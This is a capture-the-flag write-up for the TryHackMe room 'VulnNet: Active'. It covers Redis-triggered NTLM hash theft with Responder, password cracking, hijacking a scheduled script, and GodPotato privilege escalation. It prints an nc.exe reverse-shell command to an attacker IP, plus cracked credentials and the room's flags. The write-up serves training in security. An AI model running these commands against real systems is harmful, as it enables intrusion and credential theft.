# CTF Writeup: VulnNet: Active

**Target IP:** `10.48.159.208` ($target)

## Metadata

- **CTF Name:** VulnNet: Active
    
- **Platform:** TryHackMe
    
- **Date:** 2026-05-10
    
- **Tools Used:** nmap, netexec, rpcclient, redis-cli, responder, john, smbclient, GodPotato
    
- **Key Skills/Tools:** SMB Enumeration, Redis exploitation (NTLM theft), NTLMv2 Hash Cracking, Scheduled Task hijacking (PowerShell), Local Privilege Escalation (GodPotato).
    

## Reconnaissance

### 1. Port Scanning

Initial identification of open ports and services using a multi-stage Nmap scan.

**Command:**

```
😎 amuzed@Kali (~/THM/Vulnet_Active)
$ nmap -p- -Pn $target -v --min-rate 1000 --max-rtt-timeout 1000ms --max-retries 5 -oN nmap_ports.txt && sleep 5 && nmap -Pn $target -sV -sC -v -oN nmap_sVsC.txt && sleep 5 && nmap -T5 -Pn $target -v --script vuln -oN nmap_vuln.txt
```

**Key Results:**

- **53/tcp**: domain
    
- **135/tcp**: msrpc
    
- **139/445/tcp**: SMB
    
- **6379/tcp**: redis
    
- **9389/tcp**: adws
    

## Foothold

### 1. NTLMv2 Hash Capture (Redis + Responder)

Using `responder` to listen for incoming authentication attempts.

**Attacker Side (Responder):**

```
$ sudo responder -I tun0
```

**Target Side (Redis CLI):**

The open Redis service was leveraged to force an authentication attempt back to the attacker machine.

```
$ redis-cli -h $target
10.48.159.208:6379> CONFIG SET dbfilename test.rdb
10.48.159.208:6379> CONFIG SET dir \\192.168.230.58\test\test.txt
```

- **Result:** Captured NTLMv2 hash for user `enterprise-security`.
    

### 2. Hash Cracking

The captured hash was cracked using `john` and the `rockyou.txt` wordlist.

- **Credentials:** `enterprise-security : sand_0873959498`
    

### 3. Initial Access (SMB Hijacking)

A writable SMB share named `Enterprise-Share` contained a PowerShell script `PurgeIrrelevantData_1826.ps1`. I appended a reverse shell to this script and re-uploaded it to gain execution when the task triggered.

## Privilege Escalation

### 1. Enumeration

Checking the user's privileges revealed that `SeImpersonatePrivilege` was enabled.

### 2. Exploitation (GodPotato)

I used `certutil` to transfer `GodPotato-NET4.exe` and `nc.exe` to the target.

**Execution:**

```
./GodPotato-NET4.exe -cmd "C:\users\enterprise-security\desktop\nc.exe -e cmd.exe 192.168.230.58 8009"
```

### 3. Root Access

The exploit successfully spawned a SYSTEM shell.

- **Result:** `whoami` -> `nt authority\system`
    

## Flags

- **User Flag:** `THM{3eb176aee96432d5b100bc93580b291e}`
    
- **Root Flag:** `THM{d540c0645975900e5bb9167aa431fc9b}`
